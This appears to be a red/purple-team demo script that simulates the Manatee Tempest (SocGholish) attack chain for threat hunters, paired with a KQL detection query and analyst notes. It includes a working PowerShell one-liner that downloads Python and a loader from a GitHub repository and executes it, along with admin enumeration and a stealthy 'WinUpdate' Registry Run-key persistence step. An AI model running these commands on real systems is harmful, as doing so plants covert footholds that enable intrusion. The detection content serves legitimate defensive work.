# Manatee Tempest Simulation V3: Demo Script

## 1. The Narrative (Introduction)

**The Actor:** Manatee Tempest (SocGholish / Raspberry Robin).

**The Scenario:** A user has been tricked into executing a small command. We are now observing a refined "Stage 1" transition where the attacker stages a payload, enumerates the local environment, and establishes a self-sustaining foothold — all while avoiding the detection signatures that burned V1 and V2.

**Key Difference from V2:** Persistence no longer relies on Scheduled Tasks (`schtasks.exe`). Instead, the script writes a Registry Run key under `HKCU`, which fires on every user logon. This avoids spawning `schtasks.exe` entirely and requires no elevation.

---

## 2. Execution Steps & Talking Points

### Step A: The Ingress (Living off the Land)

**Action:** Run the PowerShell command (Stage 0).

```powershell
powershell.exe -Command "curl.exe -L https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip -o C:\ProgramData\python.zip; curl.exe -L https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/refs/heads/main/V3/stage1.py -o C:\ProgramData\hklib.py; Expand-Archive -LiteralPath C:\ProgramData\python.zip -DestinationPath C:\ProgramData\py3 -Force; del C:\ProgramData\python.zip; & C:\ProgramData\py3\python.exe C:\ProgramData\hklib.py"
```

**Narrative:** "We start with a single line of PowerShell. We use curl.exe to pull a legitimate Python environment and our loader from GitHub. This bypasses many basic file-reputation filters because the traffic goes to a trusted domain."

**Hunter Note:** Watch for `powershell.exe` or `cmd.exe` spawning `curl.exe` followed by a large file download to `C:\ProgramData`.

---

### Step B: Payload Staging (DLL Download — No Execution)

**Action:** Python script downloads the DLL to disk.

**Narrative:** "Our loader fetches the payload: `TEST_Dll1.dll`. Unlike V1, the DLL is never executed. It is staged on disk for a hypothetical Stage 2 handoff — the attacker parks the weapon system for a future operator. If the DLL already exists from a previous run, this phase is skipped entirely."

**Visual Check:** Show the DLL appearing in `C:\ProgramData\`.

**Idempotency:** On re-runs, the log shows `[SKIP] DLL already staged`.

---

### Step C: Environment Discovery (Local Admin Enumeration)

**Action:** The script runs `net localgroup Administrators`.

**Narrative:** "Before establishing persistence, the script enumerates the local Administrators group. This is a classic discovery technique (MITRE T1069.001). The attacker needs to know who has elevated access on this machine. This runs on every execution — not just the first — because group membership can change."

**Technical Check:** Review `C:\ProgramData\stage1.log` for the enumerated admin list.

---

### Step D: Self-Persistence (Registry Run Key)

**Action:** Registry value creation under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.

**Narrative:** "To ensure we don't lose access, we write a Registry Run key named `WinUpdate` under `HKCU`. Critically, we use Python's built-in `winreg` module — no `reg.exe` child process is spawned, making this significantly stealthier than shelling out. The Run key fires our Python loader on every user logon. If the key already exists from a previous run, creation is skipped."

**MITRE Technique:** T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys

**Technical Check:** Run `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinUpdate`.

**Idempotency:** On re-runs, the log shows `[SKIP] Run key 'WinUpdate' already exists`.

**Cleanup:** `reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinUpdate /f`

---

### Step E: Validation (The Log)

**Action:** Review the log file.

**Narrative:** "Let's check our operational log. On first run, we see three `[OK]` entries. On subsequent runs triggered by the Run key (after logon), we see `[SKIP]` for the DLL and Run key, but a fresh admin enumeration — proving the persistence heartbeat is alive."

**First Run Log:**
```
[OK] DLL staged to C:\ProgramData\TEST_Dll1.dll
=== Local Admin Group ===
...
=========================
[OK] Self-persistence established via Registry Run key 'WinUpdate'.
```

**Re-run Log:**
```
[SKIP] DLL already staged at C:\ProgramData\TEST_Dll1.dll
=== Local Admin Group ===
...
=========================
[SKIP] Run key 'WinUpdate' already exists.
```

---

## 3. KQL Threat Hunt Query

```kql
// ══════════════════════════════════════════════════════════════════
// Threat Hunt: Suspicious Execution Chain Detection (V3 — Registry)
// Approach: Behavioral detection — no prior knowledge of payloads
// ══════════════════════════════════════════════════════════════════
let Python_NonStandard = 
    DeviceProcessEvents
    | where FileName =~ "python.exe" or FileName =~ "python3.exe"
    | where not(FolderPath has_any (
        "Program Files", 
        "Program Files (x86)", 
        "AppData\\Local\\Programs\\Python",
        "AppData\\Local\\Microsoft\\WindowsApps",
        "Users\\",
        "Windows\\py.exe"
    ))
    | extend Tactic_Detected = "Python Non-Standard Location"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected, 
              FolderPath, ProcessCommandLine, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let Enumeration =
    DeviceProcessEvents
    | where FileName == "net.exe" or FileName == "net1.exe"
    | where ProcessCommandLine has "localgroup" 
        and ProcessCommandLine has "Administrators"
    | extend Tactic_Detected = "Enumeration"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              FolderPath, ProcessCommandLine, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let Persistence =
    DeviceRegistryEvents
    | where RegistryKey endswith @"\CurrentVersion\Run"
    | where ActionType == "RegistryValueSet"
    | extend Tactic_Detected = "Persistence"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              RegistryKey, RegistryValueName, RegistryValueData,
              InitiatingProcessFileName, InitiatingProcessParentFileName;
// ── Combine and summarize ──
union Python_NonStandard, Enumeration, Persistence
| summarize 
    Tactics = make_set(Tactic_Detected),
    Tactic_Count = dcount(Tactic_Detected),
    Parent_Processes = make_set(InitiatingProcessFileName),
    GrandParent_Processes = make_set(InitiatingProcessParentFileName),
    Commands = make_set(ProcessCommandLine),
    Paths = make_set(FolderPath),
    First_Seen = min(Timestamp),
    Last_Seen = max(Timestamp),
    Event_Count = count()
    by DeviceName, AccountName
| extend Risk = case(Tactic_Count == 3, "HIGH", Tactic_Count == 2, "MEDIUM", "LOW")
| sort by Tactic_Count desc
```

---

## 4. Summary for Security Analysts

**Detection Strategy:** Hunt for the combination of discovery commands (`net.exe` from `python.exe`) and registry persistence (`DeviceRegistryEvents` with Run key writes from `python.exe`). On re-runs after logon, the Run key produces a `python.exe` process spawned by `userinit.exe` → `explorer.exe` — this orphaned lineage from a non-standard path is a high-confidence persistence indicator.

**V1 → V2 → V3 Comparison:**
| Signal | V1 (Burned) | V2 (Improved) | V3 (Registry) |
|--------|-------------|---------------|----------------|
| Task target | `rundll32.exe ... .dll` | `python.exe ... .py` | N/A (no task) |
| Persistence method | Scheduled Task | Scheduled Task | Registry Run Key |
| MITRE Technique | T1053.005 | T1053.005 | T1547.001 |
| DLL execution | Every minute | Never | Never |
| Idempotency | None | Checks before acting | Checks before acting |
| Discovery | None | `net localgroup Administrators` | `net localgroup Administrators` |
| Child process for persistence | `schtasks.exe` | `schtasks.exe` | None (direct API) |
| Trigger | Every minute | Every 5 minutes | Every user logon |
| Elevation required | Yes | Yes (for HKLM) / No | No (HKCU) |

**Impact:** This access is what Manatee Tempest sells to ransomware operators to facilitate the final encryption stage.
